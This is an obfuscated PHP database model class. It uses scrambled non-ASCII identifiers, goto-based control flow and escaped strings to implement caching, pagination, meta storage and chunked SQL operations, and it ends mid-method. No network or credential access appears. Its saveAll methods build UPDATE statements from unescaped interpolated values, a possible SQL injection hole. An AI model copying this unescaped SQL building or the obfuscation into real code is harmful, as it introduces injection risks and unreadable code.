_beforeUpdate(&$d†¬ÁÇ¥Íñ, $cğó§´…º†) { $bÃÔ…¤Õ¾ =& $_SERVER[Õİõş]; if (!$this->checkDataAutoHas($bÃÔ…¤Õ¾[341])) { return; } $this->dataBeforeFilter($d†¬ÁÇ¥Íñ, $bÃÔ…¤Õ¾[341]); } protected function _afterSelect(&$F’œß»­ËÈ, $e–µàÕß­ê) { if (!is_array($F’œß»­ËÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Õİõş][342])) { return; } foreach ($F’œß»­ËÈ as &$f‹¸ ±¦ƒ») { $this->dataAfterFilter($f‹¸ ±¦ƒ»); } } protected function _afterFind(&$cŸŠ¦¸˜òó, $B½ˆÉ³ï¼ù) { if (!is_array($cŸŠ¦¸˜òó)) { return; } if (!$this->checkDataAutoHas($_SERVER[Õİõş][342])) { return; } $this->dataAfterFilter($cŸŠ¦¸˜òó); } public function setAutoIncrement($d¢¿õ©İÈƒ) { $d¦‡º¤‹¢ó = array($this->getPk() => $d¢¿õ©İÈƒ); $aåÀÂÀ÷á = $this->data($d¦‡º¤‹¢ó)->add(); if ($aåÀÂÀ÷á) { $this->delete($aåÀÂÀ÷á); } } public function getAutoIncrement() { $fÅ¬©ì° = $this->getTableName(); $c˜¬¢ĞÚËİ = $this->max($this->getPk()); $EŞù’İ° = $this->query("\x73\150\157\x77\40\x74\141\x62\154\x65\x20\x73\164\x61\164\165\163\40\x77\x68\145\162\145\x20\116\141\155\x65\75\47{$fÅ¬©ì°}\x27"); $FÇŠ¤Ç„â = $EŞù’İ°[0][$_SERVER[Õİõş][343]]; $f¹ğºôã = max($c˜¬¢ĞÚËİ, $FÇŠ¤Ç„â); return $f¹ğºôã; } protected function _callBefore($b„õËó¶ÙÓ, $a•‡«Ëœ”) { return $this->cacheCallCheck($b„õËó¶ÙÓ, $a•‡«Ëœ”, !1); } protected function _callAfter($f”Ø›±çã², $e„É¢éŞÅî) { return $this->cacheCallCheck($f”Ø›±çã², $e„É¢éŞÅî, !0); } protected function cacheFunctionAlias($d„™†¦ÛáÈ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($dí²µŒ»°í, $F‹Áê£òöë, $D‹”¨ÜØÑ = false) { $FÈë„Ú¤…ê = $this->cacheFunctionAlias($F‹Áê£òöë); if (!$FÈë„Ú¤…ê) { return; } foreach ($FÈë„Ú¤…ê as $c°‚³§×» => $bÀÇî„”î) { $b»Í‘Ûƒì‚ = $bÀÇî„”î[0]; $eÙ¶«™í = explode($_SERVER[Õİõş][47], $bÀÇî„”î[1]); if ($dí²µŒ»°í == $c°‚³§×») { return $this->cacheFunctionGet($c°‚³§×», $b»Í‘Ûƒì‚); } if ($D‹”¨ÜØÑ && in_array($dí²µŒ»°í, $eÙ¶«™í)) { $this->cacheFunctionClear($c°‚³§×», $b»Í‘Ûƒì‚); } } } public function cacheFunctionGet($d×Ê’Ñåó™, $Eø¤•Ë¾‰ô) { $bÏ—ÎçñÙ = $this->cacheKeyMake($d×Ê’Ñåó™, $Eø¤•Ë¾‰ô); $b¨»ÛÕƒÃ = Cache::get($bÏ—ÎçñÙ); if (!is_array($b¨»ÛÕƒÃ)) { $b¨»ÛÕƒÃ = call_user_func_array(array($this, $d×Ê’Ñåó™), array($Eø¤•Ë¾‰ô, !0)); Cache::set($bÏ—ÎçñÙ, $b¨»ÛÕƒÃ); } return $b¨»ÛÕƒÃ; } public function cacheFunctionClear($C¼Å™×¦Üˆ, $aØÉĞÙåï) { $AÑò·§æ­Ã = $aØÉĞÙåï; if (!is_array($aØÉĞÙåï)) { $AÑò·§æ­Ã = array($aØÉĞÙåï); } foreach ($AÑò·§æ­Ã as $AÎ„­ğ»õÊ) { $D‰¬¡Ö§§¯ = $this->cacheKeyMake($C¼Å™×¦Üˆ, $AÎ„­ğ»õÊ); Cache::remove($D‰¬¡Ö§§¯); } } private function cacheKeyMake($fÁßÍˆæÌ¤, $D¡ïÜÆ‹Áù) { $d×ÓîŒ¸Šƒ =& $_SERVER[Õİõş]; return get_class($this) . $d×ÓîŒ¸Šƒ[70] . $fÁßÍˆæÌ¤ . $d×ÓîŒ¸Šƒ[344] . $D¡ïÜÆ‹Áù; } protected function selectPage($E…§’„ĞÏ = 200, $DğÊĞ¤ã­ = 1) { goto E‚öÔƒæÍ; F›è«èª¿ó: $this->optionsValue($Aì¾Ó”­Ô°); $Cà”é£’ÏÛ = $this->page($DğÊĞ¤ã­, $E…§’„ĞÏ)->select(); $Cà”é£’ÏÛ = is_array($Cà”é£’ÏÛ) ? $Cà”é£’ÏÛ : array(); goto CÓÌù„ÌóÅ; d¤ÃÕâÁ°¥: $bô¢¼„÷è = ceil($EÄËôË†‹ / $E…§’„ĞÏ); $DğÊĞ¤ã­ = intval(isset($in[$fŒ®³İç¿—[336]]) ? $in[$fŒ®³İç¿—[336]] : $DğÊĞ¤ã­); $DğÊĞ¤ã­ = $DğÊĞ¤ã­ <= 1 ? 1 : ($DğÊĞ¤ã­ >= $bô¢¼„÷è ? $bô¢¼„÷è : $DğÊĞ¤ã­); goto F›è«èª¿ó; BÌ‹°Óô†: $B‹êßƒ¸ğ = 4000; $E…§’„ĞÏ = isset($in[$fŒ®³İç¿—[345]]) ? $in[$fŒ®³İç¿—[345]] : $E…§’„ĞÏ; if ($E…§’„ĞÏ === -1) { unset($in[$fŒ®³İç¿—[345]]); $B‹êßƒ¸ğ = 100000000; $E…§’„ĞÏ = $B‹êßƒ¸ğ; } goto DøËºÊ«¾‚; DøËºÊ«¾‚: $B‘•ßÛ©ïì = $Aì¾Ó”­Ô°; $B‘•ßÛ©ïì[$fŒ®³İç¿—[346]] = array(); $this->optionsValue($B‘•ßÛ©ïì); goto eÃ­ †—•; eÃ­ †—•: $EÄËôË†‹ = intval($this->count()); $E…§’„ĞÏ = intval($E…§’„ĞÏ); $E…§’„ĞÏ = $E…§’„ĞÏ <= 5 ? 5 : ($E…§’„ĞÏ >= $B‹êßƒ¸ğ ? $B‹êßƒ¸ğ : $E…§’„ĞÏ); goto d¤ÃÕâÁ°¥; CÓÌù„ÌóÅ: if ($bô¢¼„÷è == 1) { $EÄËôË†‹ = count($Cà”é£’ÏÛ); } $A…‹§•ÚëÆ = array($fŒ®³İç¿—[347] => array($fŒ®³İç¿—[348] => $EÄËôË†‹, $fŒ®³İç¿—[345] => $E…§’„ĞÏ, $fŒ®³İç¿—[336] => $DğÊĞ¤ã­, $fŒ®³İç¿—[349] => $bô¢¼„÷è), $fŒ®³İç¿—[350] => $Cà”é£’ÏÛ ? $Cà”é£’ÏÛ : array()); return $A…‹§•ÚëÆ; goto bšÇÇÈÛÏ—; E‚öÔƒæÍ: $fŒ®³İç¿— =& $_SERVER[Õİõş]; global $in; $Aì¾Ó”­Ô° = $this->optionsValue(); goto BÌ‹°Óô†; bšÇÇÈÛÏ—: } protected function checkLength($d˜©Ï¡Ô , $Eˆ—çÑÁÛ° = 0, $c Ññ‚Ã¢ = '') { $fİïÕ¹çÍ¾ =& $_SERVER[Õİõş]; $Eˆ—çÑÁÛ° = $Eˆ—çÑÁÛ° ? $Eˆ—çÑÁÛ° : 65536; if (!$d˜©Ï¡Ô  || strlen($d˜©Ï¡Ô ) < $Eˆ—çÑÁÛ°) { return; } $c Ññ‚Ã¢ = $c Ññ‚Ã¢ ? $c Ññ‚Ã¢ . $fİïÕ¹çÍ¾[67] : $fİïÕ¹çÍ¾[33]; show_json($c Ññ‚Ã¢ . LNG($fİïÕ¹çÍ¾[351]) . "\50{$Eˆ—çÑÁÛ°}\x29", !1); } protected function metaSet($e÷À•í§Â, $aÔÊÙ¶õ’ = null, $BéÄšîÑñ¼ = null) { goto d‚¦Æ×ƒÎ«; B±Ø™Â‚œŠ: if (is_null($aÔÊÙ¶õ’)) { return $a±Õ¾”Ñ½ù->where(array($B¬ºøÌ„Ÿ¿ => $e÷À•í§Â))->delete(); } if (is_null($BéÄšîÑñ¼)) { return $a±Õ¾”Ñ½ù->where($FææÛáÏù)->delete(); } $DÖÁ¢›„ˆÒ = is_array($aÔÊÙ¶õ’) ? $aÔÊÙ¶õ’ : array(); goto e¬ì‡ã×„è; d‚¦Æ×ƒÎ«: $Fß¢Ñ¯¢´Ï =& $_SERVER[Õİõş]; if (!$this->tableMeta) { return !1; } $B¬ºøÌ„Ÿ¿ = $this->tableMeta[$Fß¢Ñ¯¢´Ï[352]]; goto Dëºåë¬ğ; e¬ì‡ã×„è: if (is_string($aÔÊÙ¶õ’)) { $DÖÁ¢›„ˆÒ[$aÔÊÙ¶õ’] = $BéÄšîÑñ¼; } $F§ããÃ±šø = array(); foreach ($DÖÁ¢›„ˆÒ as $B‘¤¢¯Ï×¢ => $D×›ÁËßè) { $this->checkLength($D×›ÁËßè, !1, $fÑĞ Ì . $Fß¢Ñ¯¢´Ï[4] . $B‘¤¢¯Ï×¢); $F§ããÃ±šø[] = array($B¬ºøÌ„Ÿ¿ => $e÷À•í§Â, $Fß¢Ñ¯¢´Ï[89] => $B‘¤¢¯Ï×¢, $Fß¢Ñ¯¢´Ï[355] => $D×›ÁËßè); } goto Eß›ØïŒÆË; Dëºåë¬ğ: $fÑĞ Ì = $this->tableMeta[$Fß¢Ñ¯¢´Ï[353]]; $a±Õ¾”Ñ½ù = Model($fÑĞ Ì); $FææÛáÏù = array($B¬ºøÌ„Ÿ¿ => $e÷À•í§Â, $Fß¢Ñ¯¢´Ï[354] => $aÔÊÙ¶õ’); goto B±Ø™Â‚œŠ; Eß›ØïŒÆË: $a±Õ¾”Ñ½ù->where(array($B¬ºøÌ„Ÿ¿ => $e÷À•í§Â))->addAll($F§ããÃ±šø, array(), !0); return !0; goto cÌ÷•‡Êé²; cÌ÷•‡Êé²: } public function metaGet($Aš¹ç‚Şğ) { goto D¿ÂÏÌ·˜Í; bã²àÆõ³à: $eëæ’¼² = array_to_keyvalue($eëæ’¼², $cÆƒñ“œ¹˜[89], $cÆƒñ“œ¹˜[355]); return $eëæ’¼²; goto Fİì‘‰­; f²ğÜ¢ä˜Î: $F…ÂÅèÖ¼­ = Model($this->tableMeta[$cÆƒñ“œ¹˜[353]]); $F‡—ÙÜ”¢ = array($dÔ¡¿ˆ­­¢ => $Aš¹ç‚Şğ); $eëæ’¼² = $F…ÂÅèÖ¼­->field($cÆƒñ“œ¹˜[356])->where($F‡—ÙÜ”¢)->select(); goto bã²àÆõ³à; D¿ÂÏÌ·˜Í: $cÆƒñ“œ¹˜ =& $_SERVER[Õİõş]; if (!$this->tableMeta) { return array(); } $dÔ¡¿ˆ­­¢ = $this->tableMeta[$cÆƒñ“œ¹˜[352]]; goto f²ğÜ¢ä˜Î; Fİì‘‰­: } private function checkDataAutoHas($c™Ñ–ñ½—) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $eßÜ¾–½ÆÍ) { if (in_array($c™Ñ–ñ½—, explode($_SERVER[Õİõş][47], $eßÜ¾–½ÆÍ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$A¬·Ïö¬÷, $FÜÓ¥ãÙèª) { $cå‚„ïøÊÙ =& $_SERVER[Õİõş]; foreach ($this->dataAuto as $E¿åÍ¨„­ö) { $Eâá¥¦¹§– = $E¿åÍ¨„­ö[0]; if (!in_array($FÜÓ¥ãÙèª, explode($cå‚„ïøÊÙ[47], $E¿åÍ¨„­ö[2]))) { continue; } switch (trim($E¿åÍ¨„­ö[3])) { case $cå‚„ïøÊÙ[305]: case $cå‚„ïøÊÙ[306]: $AÍƒÂø¬ê„ = $E¿åÍ¨„­ö[1]; $D‚ÀŒø«Ï = isset($E¿åÍ¨„­ö[4]) ? (array) $E¿åÍ¨„­ö[4] : array(); if ($AÍƒÂø¬ê„ == $cå‚„ïøÊÙ[186] && array_key_exists($Eâá¥¦¹§–, $A¬·Ïö¬÷)) { if (!$A¬·Ïö¬÷[$Eâá¥¦¹§–]) { unset($A¬·Ïö¬÷[$Eâá¥¦¹§–]); } break; } if (isset($A¬·Ïö¬÷[$Eâá¥¦¹§–])) { array_unshift($D‚ÀŒø«Ï, $A¬·Ïö¬÷[$Eâá¥¦¹§–]); } if ($cå‚„ïøÊÙ[305] == $E¿åÍ¨„­ö[3]) { $A¬·Ïö¬÷[$Eâá¥¦¹§–] = call_user_func_array($AÍƒÂø¬ê„, $D‚ÀŒø«Ï); } else { $A¬·Ïö¬÷[$Eâá¥¦¹§–] = call_user_func_array(array(&$this, $AÍƒÂø¬ê„), $D‚ÀŒø«Ï); } break; case $cå‚„ïøÊÙ[257]: $A¬·Ïö¬÷[$Eâá¥¦¹§–] = $A¬·Ïö¬÷[$E¿åÍ¨„­ö[1]]; break; case $cå‚„ïøÊÙ[278]: if (isset($A¬·Ïö¬÷[$Eâá¥¦¹§–]) && !is_string($A¬·Ïö¬÷[$Eâá¥¦¹§–])) { $A¬·Ïö¬÷[$Eâá¥¦¹§–] = json_encode_force($A¬·Ïö¬÷[$Eâá¥¦¹§–]); } break; case $cå‚„ïøÊÙ[307]: if ($A¬·Ïö¬÷[$Eâá¥¦¹§–] === $cå‚„ïøÊÙ[33]) { unset($A¬·Ïö¬÷[$Eâá¥¦¹§–]); } break; case $cå‚„ïøÊÙ[308]: $A¬·Ïö¬÷[$Eâá¥¦¹§–] = $E¿åÍ¨„­ö[1]; default: break; } } if ($FÜÓ¥ãÙèª == $cå‚„ïøÊÙ[340]) { $Aï÷’‡É = strtolower($this->db->getDbType()); if (strpos($Aï÷’‡É, $cå‚„ïøÊÙ[9]) !== 0) { return; } $CĞêÜ‰Àï = $this->field(!0)->fields; $E†È†´˜Ÿô = $CĞêÜ‰Àï[$cå‚„ïøÊÙ[236]]; if (isset($CĞêÜ‰Àï[$cå‚„ïøÊÙ[235]])) { unset($E†È†´˜Ÿô[$CĞêÜ‰Àï[$cå‚„ïøÊÙ[235]]]); } foreach ($E†È†´˜Ÿô as $Bİà×æÂø => $FÜÓ¥ãÙèª) { if (!isset($A¬·Ïö¬÷[$Bİà×æÂø])) { $A¬·Ïö¬÷[$Bİà×æÂø] = $cå‚„ïøÊÙ[33]; } } } } private function dataAfterFilter(&$FÊº¨œµäæ) { $aÏŠ¬ÂìÜ… =& $_SERVER[Õİõş]; foreach ($this->dataAuto as $F›†¹ÑƒÀ¼) { $FƒŸ¶îº£ = $F›†¹ÑƒÀ¼[0]; if (!in_array($aÏŠ¬ÂìÜ…[342], explode($aÏŠ¬ÂìÜ…[47], $F›†¹ÑƒÀ¼[2]))) { continue; } if (!isset($FÊº¨œµäæ[$FƒŸ¶îº£])) { continue; } switch (trim($F›†¹ÑƒÀ¼[3])) { case $aÏŠ¬ÂìÜ…[305]: case $aÏŠ¬ÂìÜ…[306]: $FÎŒåòõ¡’ = isset($F›†¹ÑƒÀ¼[4]) ? (array) $F›†¹ÑƒÀ¼[4] : array(); array_unshift($FÎŒåòõ¡’, $FÊº¨œµäæ[$FƒŸ¶îº£]); if ($aÏŠ¬ÂìÜ…[305] == $F›†¹ÑƒÀ¼[3]) { $FÊº¨œµäæ[$FƒŸ¶îº£] = call_user_func_array($F›†¹ÑƒÀ¼[1], $FÎŒåòõ¡’); } else { $FÊº¨œµäæ[$FƒŸ¶îº£] = call_user_func_array(array(&$this, $F›†¹ÑƒÀ¼[1]), $FÎŒåòõ¡’); } break; case $aÏŠ¬ÂìÜ…[257]: $FÊº¨œµäæ[$FƒŸ¶îº£] = $FÊº¨œµäæ[$F›†¹ÑƒÀ¼[1]]; break; case $aÏŠ¬ÂìÜ…[278]: $BãÔéã”“à = $FÊº¨œµäæ[$FƒŸ¶îº£]; $FÊº¨œµäæ[$FƒŸ¶îº£] = json_decode($BãÔéã”“à, !0); if (is_null($FÊº¨œµäæ[$FƒŸ¶îº£])) { $FÊº¨œµäæ[$FƒŸ¶îº£] = $BãÔéã”“à; } break; case $aÏŠ¬ÂìÜ…[307]: if ($FÊº¨œµäæ[$FƒŸ¶îº£] === $aÏŠ¬ÂìÜ…[33]) { unset($FÊº¨œµäæ[$FƒŸ¶îº£]); } break; case $aÏŠ¬ÂìÜ…[308]: $FÊº¨œµäæ[$FƒŸ¶îº£] = $F›†¹ÑƒÀ¼[1]; default: break; } } } public function saveAll($cÅä•šë´â) { goto cÇ”‚´µÁ; aŠ¸â¦Ô: $this->chunkEventSet(); goto AöÈ÷–À§ƒ; Fƒê»ö˜Ó: $cÅä•šë´â = is_array($cÅä•šë´â) ? $cÅä•šë´â : array(); $DÉ´ÌŞÆã = $AÔóÙ‚ø[357]; $a•ç‚ù„÷¬ = 0; goto fÈñÚ©»Õ; cÇ”‚´µÁ: $AÔóÙ‚ø =& $_SERVER[Õİõş]; $CÔ—êÒˆ Ö = $this->tablePrefix . $this->tableName; $B¢ˆ‹ß‘ñ = self::SQL_WHERE_IN_CHUNK; goto Fƒê»ö˜Ó; fÈñÚ©»Õ: $f¬•éÏŸæ = array(); $D‚ŒÀÜÆ© = count($cÅä•šë´â); for ($E´Ü÷«õğ = 0; $E´Ü÷«õğ < $D‚ŒÀÜÆ©; $E´Ü÷«õğ++) { $eç¸Ã£Èù = $cÅä•šë´â[$E´Ü÷«õğ]; if (!is_array($eç¸Ã£Èù) || count($eç¸Ã£Èù) != 4) { continue; } $aéå†‘ªã® = "\x55\120\104\101\x54\x45\x20{$CÔ—êÒˆ Ö}\40\x53\105\x54\40{$eç¸Ã£Èù[2]}\40\75\40\x43\x41\123\105\x20{$eç¸Ã£Èù[0]}\40\12"; if ($a•ç‚ù„÷¬ == 0) { $DÉ´ÌŞÆã = $aéå†‘ªã®; } $f¬•éÏŸæ[] = $AÔóÙ‚ø[112] . $eç¸Ã£Èù[1] . $AÔóÙ‚ø[112]; $a•ç‚ù„÷¬++; $DÉ´ÌŞÆã .= "\x20\127\110\x45\116\x20\x27{$eç¸Ã£Èù[1]}\47\x20\124\x48\x45\116\40\47{$eç¸Ã£Èù[3]}\x27\40\xa"; if ($a•ç‚ù„÷¬ == $B¢ˆ‹ß‘ñ || $E´Ü÷«õğ == $D‚ŒÀÜÆ© - 1) { goto eëùõÀ¶Ã; eëùõÀ¶Ã: $bÅ†À²ÏºŒ = implode($AÔóÙ‚ø[47], $f¬•éÏŸæ); $DÉ´ÌŞÆã .= "\40\x45\116\104\40\x20\127\x48\105\122\x45\40{$eç¸Ã£Èù[0]}\x20\111\x4e\x20\50{$bÅ†À²ÏºŒ}\51\x20"; $this->execute($DÉ´ÌŞÆã); goto Cğˆ®˜÷†ë; b—¼Ï‰ãÀÑ: $f¬•éÏŸæ = array(); goto dµÌíˆĞî¬; Cğˆ®˜÷†ë: $a•ç‚ù„÷¬ = 0; $DÉ´ÌŞÆã = $aéå†‘ªã®; $this->chunkEventCheck(count($f¬•éÏŸæ)); goto b—¼Ï‰ãÀÑ; dµÌíˆĞî¬: } } goto aŠ¸â¦Ô; AöÈ÷–À§ƒ: } public function saveAllEach($dæ¶Á•åº³) { $Fµ·åğÁæÌ =& $_SERVER[Õİõş]; $e°”‚‚¦Ä = $this->tablePrefix . $this->tableName; foreach ($dæ¶Á•åº³ as $fÖ„ëÈ»Ùİ) { if (!is_array($fÖ„ëÈ»Ùİ) || count($fÖ„ëÈ»Ùİ) != 4) { continue; } $F™ëÀ¦¾™ = $fÖ„ëÈ»Ùİ[0] . $Fµ·åğÁæÌ[358] . $fÖ„ëÈ»Ùİ[1] . $Fµ·åğÁæÌ[112]; $EÚÀĞäÈ‹ = $fÖ„ëÈ»Ùİ[2] . $Fµ·åğÁæÌ[358] . $fÖ„ëÈ»Ùİ[3] . $Fµ·åğÁæÌ[112]; $D›‚ÛÊ¹“¤ = "\x75\x70\144\x61\164\x65\40{$e°”‚‚¦Ä}\40\163\145\x74\40{$EÚÀĞäÈ‹}\40\x77\150\145\162\145\x20{$F™ëÀ¦¾™}\x3b"; $this->execute($D›‚ÛÊ¹“¤); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($D…ÜÑ´¼÷ = false, $D»îÒ–Ïê¶ = false) { $this->_chunkEvent = $D…ÜÑ´¼÷; $this->_chunkEventParam = $D»îÒ–Ïê¶; } private function chunkEventCheck($f¶áÁ˜åè) { if (!$this->_chunkEvent) { return; } $dÅœ…„ãÒø = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $dÅœ…„ãÒø[$_SERVER[Õİõş][359]] = $f¶áÁ˜åè; Hook::trigger($this->_chunkEvent, $dÅœ…„ãÒø); } public function addAll($d„‘ùÕÏ¾, $C¶ãœ‘ê¿Ğ = array(), $B°›—×ç = false) { goto Bª‘¨Ì†«æ; Eô‹ŸÊ¥Ç³: if (method_exists($this->db, $FÚº£øœã[256])) { for ($b¾§­à¶® = 0; $b¾§­à¶® < count($d„‘ùÕÏ¾); $b¾§­à¶® += $Cİò™†ªé§) { $e°¯Â¢÷í = array_slice($d„‘ùÕÏ¾, $b¾§­à¶®, $Cİò™†ªé§); if (!is_array($e°¯Â¢÷í) || count($e°¯Â¢÷í) == 0) { break; } $e×‰ô—«éå = $this->db->insertAll($e°¯Â¢÷í, $C¶ãœ‘ê¿Ğ, $B°›—×ç); $this->chunkEventCheck(count($e°¯Â¢÷í)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($d„‘ùÕÏ¾ as $e×•§–×È => $c¦‰¿ Úæ´) { $e×‰ô—«éå = $this->db->insert($c¦‰¿ Úæ´, $C¶ãœ‘ê¿Ğ, $B°›—×ç); } $this->commit(); } if (!1 !== $e×‰ô—«éå) { $AÕ¦¦Û’÷Ê = $this->getLastInsID(); if ($AÕ¦¦Û’÷Ê) { return $AÕ¦¦Û’÷Ê; } } return $e×‰ô—«éå; goto E’­—¼¡Š†; Bª‘¨Ì†«æ: $FÚº£øœã =& $_SERVER[Õİõş]; ignore_timeout(); $Cİò™†ªé§ = self::SQL_WHERE_IN_CHUNK; goto EºÉ‰˜à´; EºÉ‰˜à´: if (empty($d„‘ùÕÏ¾)) { $this->error = think_lang($FÚº£øœã[255]); return !1; } $C¶ãœ‘ê¿Ğ = $this->_parseOptions($C¶ãœ‘ê¿Ğ); foreach ($d„‘ùÕÏ¾ as $e×•§–×È => $c¦‰¿ Úæ´) { $d„‘ùÕÏ¾[$e×•§–×È] = $this->_facade($c¦‰¿ Úæ´); $this->_beforeInsert($d„‘ùÕÏ¾[$e×•§–×È], $C¶ãœ‘ê¿Ğ); } goto Eô‹ŸÊ¥Ç³; E’­—¼¡Š†: } public function save($e´Çê Ç·â = '', $a±š™‹¹± = array()) { goto f÷À°æ“Œ; F¹ÙËæÒÕá: $fä°«¥ë™Ã = $bˆ»¼°µˆÅ[$DÇ¶Á»ğîÛ[259]][$B½§†¢‹…Ÿ][1]; $fä°«¥ë™Ã = is_array($fä°«¥ë™Ã) ? $fä°«¥ë™Ã : array(); $BİÛß»¦å = count($fä°«¥ë™Ã); goto eõ¾äÖ²Ã; f÷À°æ“Œ: $DÇ¶Á»ğîÛ =& $_SERVER[Õİõş]; $e†äôÔ÷Ø‚ = self::SQL_WHERE_IN_CHUNK; $bˆ»¼°µˆÅ = $this->optionsValue(); goto eøñ«ù‹¥¢; eøñ«ù‹¥¢: $B½§†¢‹…Ÿ = $this->findWhereField($bˆ»¼°µˆÅ); if (!$B½§†¢‹…Ÿ) { return parent::save($e´Çê Ç·â, $a±š™‹¹±); } $bªëùË…ÉÔ = 0; goto F¹ÙËæÒÕá; eõ¾äÖ²Ã: for ($d‡Á¡¤Ï = 0; $d‡Á¡¤Ï < $BİÛß»¦å; $d‡Á¡¤Ï += $e†äôÔ÷Ø‚) { $Fíœ–‰ª¤¤ = array_slice($fä°«¥ë™Ã, $d‡Á¡¤Ï, $e†äôÔ÷Ø‚); if (!is_array($Fíœ–‰ª¤¤) || count($Fíœ–‰ª¤¤) == 0) { break; } $bˆ»¼°µˆÅ[$DÇ¶Á»ğîÛ[259]][$B½§†¢‹…Ÿ][1] = $Fíœ–‰ª¤¤; $this->optionsValue($bˆ»¼°µˆÅ); $bªëùË…ÉÔ += parent::save($e´Çê Ç·â, $a±š™‹¹±); $this->chunkEventCheck(count($Fíœ–‰ª¤¤)); } $this->chunkEventSet(); return $bªëùË…ÉÔ; goto E”©ŠÚÕ­ğ; E”©ŠÚÕ­ğ: } public function add($D‡¢ÃõÓ—ó = '', $F¢ôùß¬¡ = array(), $aÇù„ÏæÛ = false) { if ($this->addTaskStatus && is_array($D‡¢ÃõÓ—ó)) { $this->addTaskData[] = $D‡¢ÃõÓ—ó; return; } return parent::add($D‡¢ÃõÓ—ó, $F¢ôùß¬¡, $aÇù„ÏæÛ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($e‰Š¢Åã© = array()) { goto bÈóº‘È»; A¼Ùé‘÷³ê: return $D‘¯Ù»²‡õ; goto D†±Ò±¾Î; DäÊ¬´˜²á: $A« ¸ñ”ˆ = is_array($A« ¸ñ”ˆ) ? $A« ¸ñ”ˆ : array(); $D‘¯Ù»²‡õ = null; for ($cƒîÚ®õˆâ = 0; $cƒîÚ®õˆâ < count($A« ¸ñ”ˆ); $cƒîÚ®õˆâ += $CğìÖ“±Í) { $C² ˆÊ¼å± = array_slice($A« ¸ñ”ˆ, $cƒîÚ®õˆâ, $CğìÖ“±Í); if (!is_array($C² ˆÊ¼å±) || count($C² ˆÊ¼å±) == 0) { break; } $fäÊŠ°à§ğ[$AÒÎ˜…§«®[259]][$f÷¶›µš‰±][1] = $C² ˆÊ¼å±; $this->optionsValue($fäÊŠ°à§ğ); $CïèÙéÈÊ = parent::select($e‰Š¢Åã©); if (!$CïèÙéÈÊ) { continue; } if (is_null($D‘¯Ù»²‡õ)) { $D‘¯Ù»²‡õ = array(); } $D‘¯Ù»²‡õ = array_merge($D‘¯Ù»²‡õ, $CïèÙéÈÊ); } goto A¼Ùé‘÷³ê; BßÍĞ•Ã: $f÷¶›µš‰± = $this->findWhereField($fäÊŠ°à§ğ); if (!$f÷¶›µš‰± || isset($fäÊŠ°à§ğ[$AÒÎ˜…§«®[276]]) || isset($fäÊŠ°à§ğ[$AÒÎ˜…§«®[336]])) { return parent::select($e‰Š¢Åã©); } $A« ¸ñ”ˆ = $fäÊŠ°à§ğ[$AÒÎ˜…§«®[259]][$f÷¶›µš‰±][1]; goto DäÊ¬´˜²á; bÈóº‘È»: $AÒÎ˜…§«® =& $_SERVER[Õİõş]; $CğìÖ“±Í = self::SQL_WHERE_IN_CHUNK; $fäÊŠ°à§ğ = $this->optionsValue(); goto BßÍĞ•Ã; D†±Ò±¾Î: } public function delete($BÆÂÕ½¥£ = array()) { goto Cæ½Åââ¼ ; Cæ½Åââ¼ : $bÅÊ¹±‚‚ =& $_SERVER[Õİõş]; $F‘ãï™±Ö³ = self::SQL_WHERE_IN_CHUNK; $bÓŸÀïàÄ¤ = $this->optionsValue(); goto C˜àöƒæ©; C˜àöƒæ©: $aèåµÑ£º = $this->findWhereField($bÓŸÀïàÄ¤); if (!$aèåµÑ£º) { return parent::delete($BÆÂÕ½¥£); } $dËÃÈš = 0; goto dï‚¢ÑòàÄ; e»’Ùƒ·à: return $dËÃÈš; goto b—ÀŠâÓØÎ; dï‚¢ÑòàÄ: $a‰íùº–ˆ× = $bÓŸÀïàÄ¤[$bÅÊ¹±‚‚[259]][$aèåµÑ£º][1]; $a‰íùº–ˆ× = is_array($a‰íùº–ˆ×) ? $a‰íùº–ˆ× : array(); for ($eÈ×·„‹ø = 0; $eÈ×·„‹ø < count($a‰íùº–ˆ×); $eÈ×·„‹ø += $F‘ãï™±Ö³) { $B—í”šÒÜÊ = array_slice($a‰íùº–ˆ×, $eÈ×·„‹ø, $F‘ãï™±Ö³); if (!is_array($B—í”šÒÜÊ) || count($B—í”šÒÜÊ) == 0) { break; } $bÓŸÀïàÄ¤[$bÅÊ¹±‚‚[259]][$aèåµÑ£º][1] = $B—í”šÒÜÊ; $this->optionsValue($bÓŸÀïàÄ¤); $dËÃÈš += parent::delete($BÆÂÕ½¥£); } goto e»’Ùƒ·à; b—ÀŠâÓØÎ: } private function findWhereField($dãëâ©îŞ) { $d’ß‚‡Æä =& $_SERVER[Õİõş]; $AòÂÕˆØ¦Ê = self::SQL_WHERE_IN_CHUNK; if (!is_array($dãëâ©îŞ) || !is_array($dãëâ©îŞ[$d’ß‚‡Æä[259]])) { return !1; } foreach ($dãëâ©îŞ[$d’ß‚‡Æä[259]] as $Bèã¡Á»®Ë => $E‹¦‰ïÛÔ¶) { if (is_array($E‹¦‰ïÛÔ¶) && isset($E‹¦‰ïÛÔ¶[0]) && is_string($E‹¦‰ïÛÔ¶[0]) && strtolower($E‹¦‰ïÛÔ¶[0]) == $d’ß‚‡Æä[7] && is_array($E‹¦‰ïÛÔ¶[1]) && count($E‹¦‰ïÛÔ¶[1]) > $AòÂÕˆØ¦Ê) { ignore_timeout(); return $Bèã¡Á»®Ë; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\x6d\117\x70\164\151\x6f\156"; public $field = array(); public function listData($f¿…¾©Ä¹ = false, $cËÆ°ò¸» = "\x6d\157\144\151\x66\x79\124\x69\x6d\145", $F–ŒòŞ˜£ñ = false) { $cÎŸ×âˆîÉ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cÎŸ×âˆîÉ) { return $f¿…¾©Ä¹ ? null : array(); } if (!$f¿…¾©Ä¹) { $cÎŸ×âˆîÉ = array_filter(array_values($cÎŸ×âˆîÉ)); return array_sort_by($cÎŸ×âˆîÉ, $cËÆ°ò¸», 